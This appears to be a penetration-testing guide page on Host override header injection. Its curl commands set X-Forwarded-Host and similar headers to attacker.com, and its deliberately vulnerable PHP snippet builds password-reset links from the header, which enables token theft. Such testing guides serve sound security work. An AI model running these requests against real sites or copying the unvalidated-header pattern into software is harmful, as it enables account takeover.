# 1.2 Host Override Headers

## Goal

Test if application trusts override headers like X-Forwarded-Host, which bypass Host header validation.

---

## What are Override Headers?

When proxies/load balancers exist, they send override headers:

```
Original request from client:
Host: target.com
X-Forwarded-Host: client-ip-detected

Server checks X-Forwarded-Host first (to get real client IP)
If no validation: Attacker can set X-Forwarded-Host to anything!
```

---

## Common Override Headers

```
X-Forwarded-Host     ← MOST COMMON
X-Host               ← Some frameworks
Forwarded            ← RFC 7239 standard
X-Original-Host      ← IIS/legacy systems
X-Rewrite-URL        ← IIS specific
X-Forwarded-Server   ← Some proxies
X-HTTP-Host          ← Older systems
```

---

## Testing Process

### Test Each Header

```bash
# Test X-Forwarded-Host
curl -H "X-Forwarded-Host: attacker.com" https://target.com/

# Test X-Host
curl -H "X-Host: attacker.com" https://target.com/

# Test Forwarded (RFC 7239)
curl -H "Forwarded: host=attacker.com" https://target.com/

# Test X-Original-Host
curl -H "X-Original-Host: attacker.com" https://target.com/
```

### Observe Response

Same as Host header reflection:
- Do absolute URLs use override header value?
- Do redirects use attacker domain?
- Are emails affected?

---

## Real-World Example

### Vulnerable Code
```php
// Gets Host from override header
$host = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST'];

// Uses directly without validation
$reset_link = "https://$host/reset?token=$token";
$email->send("Reset link: $reset_link");
```

### Attack
```bash
curl -H "X-Forwarded-Host: attacker.com" \
     -H "Host: target.com" \
     https://target.com/reset

# Email sent with: https://attacker.com/reset?token=xyz
# User clicks attacker's link → Account takeover!
```

---

## Testing Combinations

Sometimes need to combine headers:

```bash
# With both headers
curl -H "Host: target.com" \
     -H "X-Forwarded-Host: attacker.com" \
     https://target.com/

# Different priority combinations
curl -H "X-Forwarded-Host: attacker.com" \
     -H "X-Host: attacker.com" \
     -H "Forwarded: host=attacker.com" \
     https://target.com/
```

- [ ] Check if affects redirects

- [ ] Document which headers work

---

## Success Indicators

**Override header vulnerable if:**
- ✅ Application trusts X-Forwarded-Host over Host
- ✅ Absolute URLs use override header value
- ✅ Redirects use override header
- ✅ No validation of override header value
- ✅ Emails use override header domain
